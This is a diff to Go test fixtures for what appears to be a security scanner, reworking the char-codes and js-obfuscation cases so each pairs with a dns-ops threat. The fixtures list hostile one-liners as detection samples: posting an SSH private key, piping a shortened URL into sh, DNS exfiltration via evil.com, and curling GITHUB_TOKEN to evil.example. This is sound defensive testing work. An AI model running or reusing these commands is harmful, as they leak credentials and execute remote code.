@@ -35,7 +35,9 @@ var corePositives = []fixture{
 	{"sensitive-exfil", "steal.py", `d = open('.ssh/id_rsa').read(); requests.post(url, data=d)`},
 	{"dll-hijack", "win.py", `ctypes.windll.kernel32.LoadLibraryA(b"evil.dll")`},
 	{"shady-urls", "install.sh", `curl -sL https://bit.ly/3xKpL9q | sh`},
-	{"char-codes", "obf.js", `var s = String.fromCharCode(104, 105);`},
+	// char-codes is a capability now, so the fixture needs a threat to pair
+	// with. socket.gethostbyname trips dns-ops, which remains a threat.
+	{"char-codes", "obf.js", `var s = String.fromCharCode(104, 105); socket.gethostbyname(payload);`},
 	{"dns-ops", "resolve.py", `socket.gethostbyname("data." + payload + ".evil.com")`},
 	{"env-access-sensitive", "conf.py", `AWS_SECRET = os.environ["AWS_SECRET_ACCESS_KEY"]`},
 	{"package-manager", "setup.sh", `pip install requests`},
@@ -102,7 +104,11 @@ jobs:
       - run: echo ${{ secrets.GITHUB_TOKEN }} | curl -d @- http://evil.example
 `},
 
-	{"js-obfuscation", "bundle.js", `var a = String.fromCharCode(97, 98);`},
+	// js-obfuscation's fixture used to pair implicitly with char-codes, which
+	// matched the same String.fromCharCode text while it was still a threat.
+	// Now that char-codes is also a capability, this needs its own threat
+	// co-trigger: socket.gethostbyname trips dns-ops, which remains a threat.
+	{"js-obfuscation", "bundle.js", `var a = String.fromCharCode(97, 98); socket.gethostbyname(payload);`},
 	{"py-deserialize", "load.py", `obj = pickle.loads(blob)`},
 	{"py-template-injection", "web.py", `return render_template_string(user_input)`},
 }
@@ -167,6 +173,7 @@ var coreNegatives = []fixture{
 
 	// Demoted to capability: the trigger alone must now be suppressed.
 	{"non-ascii", "lone.txt", "caf" + accentedE},
+	{"char-codes", "lone.js", `var s = String.fromCharCode(104, 105);`},
 
 	// Agent rules are scoped to agent paths; the same content in ordinary
 	// project files must not fire.
